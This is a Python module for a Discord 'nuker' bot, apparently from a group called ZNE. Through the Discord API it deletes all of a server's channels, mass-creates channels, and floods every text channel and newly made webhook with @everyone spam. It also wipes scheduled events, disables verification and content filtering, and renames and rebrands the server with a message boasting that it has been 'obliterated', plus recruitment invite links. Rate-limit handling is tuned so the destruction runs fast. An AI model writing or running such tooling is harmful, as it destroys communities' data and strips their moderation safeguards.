from __future__ import annotations
import asyncio
import base64
import logging
import os
import random
from typing import Optional

import aiohttp
import discord
from aiolimiter import AsyncLimiter

from .settings import Settings, State, MISSING, now as utils_now

API = "https://discord.com/api/v10"


async def _request(session: aiohttp.ClientSession, method: str, url: str, payload: dict | None, limiter: AsyncLimiter) -> bool:
    for _ in range(5):
        async with limiter:
            async with session.request(method, url, json=payload) as resp:
                if resp.status in (200, 201, 204):
                    return True
                if resp.status == 429:
                    data = await resp.json()
                    retry_after = float(data.get("retry_after", 1.0))
                    logging.warning(f"429 retry={retry_after:.2f}s")
                    await asyncio.sleep(retry_after + 0.1)
                    continue
                return False
    return False


async def _run_batched(items: list[tuple[str, dict | None]], method: str, session: aiohttp.ClientSession, limiter: AsyncLimiter) -> int:
    ok = 0
    batch_size = max(1, int(limiter.max_rate / limiter.time_period) - 5)
    random.shuffle(items)
    for i in range(0, len(items), batch_size):
        batch = items[i:i + batch_size]
        tasks = [asyncio.create_task(_request(session, method, url, payload, limiter)) for url, payload in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok += sum(1 for r in results if not isinstance(r, Exception) and r)
        await asyncio.sleep(0.25)
        while not limiter.has_capacity(batch_size):
            await asyncio.sleep(0.05)
    return ok


class Operations:
    def __init__(self, bot: discord.Client):
        self.bot = bot
        self.settings: Settings = Settings.load()
        self.session: Optional[aiohttp.ClientSession] = None
        self.token: str = ""
        self.limiter: Optional[AsyncLimiter] = None

    async def setup(self):
        self.token = self._get_token()
        self.session = aiohttp.ClientSession(headers={"Authorization": f"Bot {self.token}"})
        rps = max(1, self.settings.requests_per_second)
        self.limiter = AsyncLimiter(rps + 1, 1.0185)
        logging.info(f"[ops] token={'set' if self.token else 'MISSING'} rps={rps}")

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    def _get_token(self) -> str:
        token = getattr(self.bot.http, "token", None)
        if token:
            return token
        for attr in ("_token", "__token"):
            t = getattr(self.bot.http, attr, None)
            if t:
                return t
        return ""

    async def _get_channels(self, guild_id: int) -> list[int]:
        url = f"{API}/guilds/{guild_id}/channels"
        try:
            async with self.session.get(url) as res:
                if res.status == 200:
                    data = await res.json()
                    return [c["id"] for c in data]
        except Exception:
            pass
        return []

    async def CrChannel(self, guild: discord.Guild) -> int:
        count = self.settings.channel_count
        names_pool = self.settings.channel_names or ["fluked"]
        items = []
        for i in range(count):
            name = names_pool[i % len(names_pool)]
            url = f"{API}/guilds/{guild.id}/channels"
            items.append((url, {"name": name, "type": 0}))
        ok = await _run_batched(items, "POST", self.session, self.limiter)
        logging.info(f"[CrChannel] {ok}/{count}")
        return ok

    async def DelChannels(self, guild: discord.Guild) -> int:
        channel_ids = await self._get_channels(guild.id)
        if not channel_ids:
            return 0
        items = [(f"{API}/channels/{cid}", None) for cid in channel_ids]
        ok = await _run_batched(items, "DELETE", self.session, self.limiter)
        logging.info(f"[DelChannels] {ok}/{len(channel_ids)}")
        return ok

    async def spam(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if not text_channels:
            return 0
        payload = {
            "content": self.settings.spam_message,
            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
        }
        items = []
        for _ in range(self.settings.spam_count):
            for channel in text_channels:
                items.append((f"{API}/channels/{channel.id}/messages", payload))
        ok = await _run_batched(items, "POST", self.session, self.limiter)
        logging.info(f"[spam] {ok}")
        return ok

    async def mess_server(self, guild: discord.Guild) -> None:
        settings = self.settings
        server_banner = None
        server_splash = None
        server_icon = None
        icon_path = "assets/zne.png"
        banner_path = "assets/zne_banner.png"

        if os.path.exists(icon_path):
            with open(icon_path, "rb") as file:
                server_icon = "data:image/png;base64," + base64.b64encode(file.read()).decode()

        if guild.premium_tier > 1 and os.path.exists(banner_path):
            with open(banner_path, "rb") as file:
                server_splash = "data:image/png;base64," + base64.b64encode(file.read()).decode()
            server_banner = server_splash

        asyncio.create_task(self._delete_scheduled_events(guild.id))

        event_payload = {
            "name": State.get_phrase(),
            "privacy_level": 2,
            "entity_type": 3,
            "scheduled_start_time": utils_now(seconds=3).isoformat(),
            "scheduled_end_time": utils_now().replace(year=2029).isoformat(),
            "description": "Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
            "entity_metadata": {"location": "https://discord.gg/Y6qZ4TKRM5 | https://zne.breed.rip"},
        }
        if server_banner is not None:
            event_payload["image"] = server_banner
        asyncio.create_task(self._create_scheduled_event(guild.id, event_payload))

        edit_payload = {
            "name": settings.server_name,
            "description": "This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
            "default_notifications": 1,
            "verification_level": 0,
            "explicit_content_filter": 0,
            "premium_progress_bar_enabled": True,
        }
        if server_icon:
            edit_payload["icon"] = server_icon
        if server_splash is not None:
            edit_payload["splash"] = server_splash
        if server_banner is not None:
            edit_payload["banner"] = server_banner

        await _request(self.session, "PATCH", f"{API}/guilds/{guild.id}", edit_payload, self.limiter)

    async def _delete_scheduled_events(self, guild_id: int):
        url = f"{API}/guilds/{guild_id}/scheduled-events"
        try:
            async with self.session.get(url) as res:
                if res.status != 200:
                    return
                data = await res.json()
            items = [(f"{API}/guilds/{guild_id}/scheduled-events/{ev['id']}", None) for ev in data if ev.get("id")]
            await _run_batched(items, "DELETE", self.session, self.limiter)
        except Exception:
            pass

    async def _create_scheduled_event(self, guild_id: int, payload: dict):
        url = f"{API}/guilds/{guild_id}/scheduled-events"
        await _request(self.session, "POST", url, payload, self.limiter)

    async def spam_webhook(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).manage_webhooks]
        if not text_channels:
            return 0

        # create webhooks
        webhook_payload = {"name": self.settings.webhook_name}
        items = [(f"{API}/channels/{c.id}/webhooks", webhook_payload) for c in text_channels]
        await _run_batched(items, "POST", self.session, self.limiter)

        # re-fetch webhooks to get tokens
        valid = []
        for c in text_channels:
            try:
                async with self.session.get(f"{API}/channels/{c.id}/webhooks") as res:
                    if res.status == 200:
                        whs = await res.json()
                        for wh in whs:
                            if wh.get("token"):
                                valid.append((wh["id"], wh["token"]))
            except Exception:
                pass

        if not valid:
            logging.info(f"[spam_webhook] no webhooks")
            return 0

        # spam webhooks
        payload = {
            "content": self.settings.webhook_message,
            "username": self.settings.webhook_name,
            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
        }
        items = []
        for _ in range(self.settings.webhook_count):
            for wid, wtoken in valid:
                items.append((f"{API}/webhooks/{wid}/{wtoken}", payload))
        ok = await _run_batched(items, "POST", self.session, self.limiter)
        logging.info(f"[spam_webhook] {ok}")
        return ok
